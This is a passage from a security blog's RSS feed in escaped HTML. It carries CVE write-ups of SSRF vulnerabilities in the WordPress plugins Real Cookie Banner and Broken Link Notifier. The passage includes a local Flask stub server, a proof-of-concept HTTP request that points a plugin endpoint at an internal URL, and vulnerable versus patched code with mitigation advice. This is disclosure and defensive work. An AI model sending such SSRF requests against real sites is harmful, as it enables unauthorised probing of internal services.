width=&#34;1268&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request to API captured in HTTP History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service with Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Use the scanner feature and route requests through BurpSuite with an Administrator user.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Capture the request to &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Modify the URL and forward:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838&amp;amp;_locale=user&amp;amp;url=http://localhost:8001/metadata&amp;amp;jobId=65 HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component&#xA;X-WP-Nonce: 83df92a708&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#34; title=&#34;Content read from local service&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#39; alt=&#34;Result&#34; height=&#34;536&#34; width=&#34;1821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Versions &lt;strong&gt;≤ 5.2.4&lt;/strong&gt; of &lt;strong&gt;Real Cookie Banner&lt;/strong&gt; contain an &lt;strong&gt;SSRF&lt;/strong&gt; vulnerability at the endpoint &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;. &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; accepts a &lt;code&gt;url&lt;/code&gt; from the client, performs &lt;code&gt;wp_remote_get()&lt;/code&gt;, and returns the raw &lt;code&gt;body&lt;/code&gt;/&lt;code&gt;headers&lt;/code&gt;, allowing an attacker with Administrator privileges (or a compromised admin session) to read and probe internal resources. Version &lt;strong&gt;5.2.5&lt;/strong&gt; introduced host/domain checks (comparing the request host with the job&amp;rsquo;s domain) to block out-of-scope URLs and reduce risk; switching to &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; and adding additional validations is recommended for stronger protection.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Update the plugin to &lt;strong&gt;5.2.5+&lt;/strong&gt; immediately.&lt;/li&gt;&#xA;&lt;li&gt;Do not trust client-supplied URLs — validate/normalize and apply a domain allowlist before fetching.&lt;/li&gt;&#xA;&lt;li&gt;Block requests to private/loopback IP ranges after DNS resolution (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, fc00::/7, etc.).&lt;/li&gt;&#xA;&lt;li&gt;Avoid forwarding internal credentials/cookies and avoid returning raw headers/body unless necessary.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; with checks for redirects, timeouts, and SSL; log and limit body size before returning to the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/real-cookie-banner/vulnerability/wordpress-real-cookie-banner-gdpr-eprivacy-cookie-consent-plugin-5-2-4-authenticated-admin-server-side-request-forgery-via-scan-without-login-endpoint-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Real Cookie Banner Plugin &amp;lt;= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6851 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-28-cve-2025-6851/</link>
      <pubDate>Tue, 28 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-28-cve-2025-6851/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Broken Link Notifier&lt;/strong&gt; plugin for WordPress is vulnerable to &lt;strong&gt;Server‑Side Request Forgery&lt;/strong&gt; in all versions up to and including &lt;strong&gt;1.3.0&lt;/strong&gt; via the &lt;code&gt;ajax_blinks()&lt;/code&gt; function which ultimately calls &lt;code&gt;check_url_status_code()&lt;/code&gt;. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to perform web requests to arbitrary addresses from the web application and can be used to query or modify information from internal services.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6851&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6851&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/broken-link-notifier/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Broken Link Notifier Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Broken Link Notifier&lt;/strong&gt;: &lt;strong&gt;1.3.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.3.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the &lt;code&gt;check_url_status_code()&lt;/code&gt; function calls &lt;code&gt;wp_remote_get()&lt;/code&gt; directly with the user-supplied URL without validating or checking the safety of the URL. This creates a &lt;strong&gt;SSRF (Server-Side Request Forgery)&lt;/strong&gt; vulnerability. This version does not check the URL scheme, whether the host is valid, or whether the IP belongs to private/reserved ranges, so all requests are executed without restriction.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    // Block SSRF to private/reserved ranges&#xA;    $unsafe = $this-&amp;gt;is_url_unsafe( $link );&#xA;    if ( $unsafe ) {&#xA;        return apply_filters( &amp;#39;blnotifier_status&amp;#39;, $unsafe );&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&#xA;&#xA;protected function is_url_unsafe( $url ) {&#xA;    $parts = wp_parse_url( $url );&#xA;&#xA;    if ( ! isset( $parts[ &amp;#39;scheme&amp;#39; ], $parts[ &amp;#39;host&amp;#39; ] ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: invalid or malformed URL&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $scheme = strtolower( $parts[ &amp;#39;scheme&amp;#39; ] );&#xA;    if ( ! in_array( $scheme, [ &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ], true ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: unsupported URL scheme&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $host = $parts[ &amp;#39;host&amp;#39; ];&#xA;    $records = @dns_get_record( $host, DNS_A &amp;#43; DNS_AAAA );&#xA;    $ips = [];&#xA;&#xA;    if ( is_array( $records ) &amp;amp;&amp;amp; count( $records ) ) {&#xA;        foreach ( $records as $record ) {&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;A&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ip&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ip&amp;#39; ];&#xA;            }&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;AAAA&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ipv6&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ipv6&amp;#39; ];&#xA;            }&#xA;        }&#xA;    } else {&#xA;        $resolved = gethostbyname( $host );&#xA;        if ( $resolved &amp;amp;&amp;amp; $resolved !== $host ) {&#xA;            $ips[] = $resolved;&#xA;        }&#xA;    }&#xA;&#xA;    if ( empty( $ips ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: host could not be resolved&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    foreach ( $ips as $ip ) {&#xA;        if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) {&#xA;            return [&#xA;                &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;                &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;                &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: resolved to internal or reserved IP address&amp;#39;,&#xA;                &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;            ];&#xA;        }&#xA;    }&#xA;&#xA;    return false; // Safe&#xA;} // End is_url_unsafe()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch added the &lt;code&gt;is_url_unsafe()&lt;/code&gt; function. Before calling &lt;code&gt;wp_remote_get()&lt;/code&gt;, the URL is checked in detail: only &lt;code&gt;http&lt;/code&gt; and &lt;code&gt;https&lt;/code&gt; schemes are allowed, the host is validated, DNS resolution is performed to obtain IPs, and any internal or reserved IP addresses are blocked. If the URL is invalid or unsafe, the function returns detailed block information and &lt;strong&gt;does not perform the request&lt;/strong&gt;, thereby &lt;strong&gt;effectively preventing SSRF&lt;/strong&gt;. The patch ensures only safe URLs are allowed to be fetched, reducing the risk of external 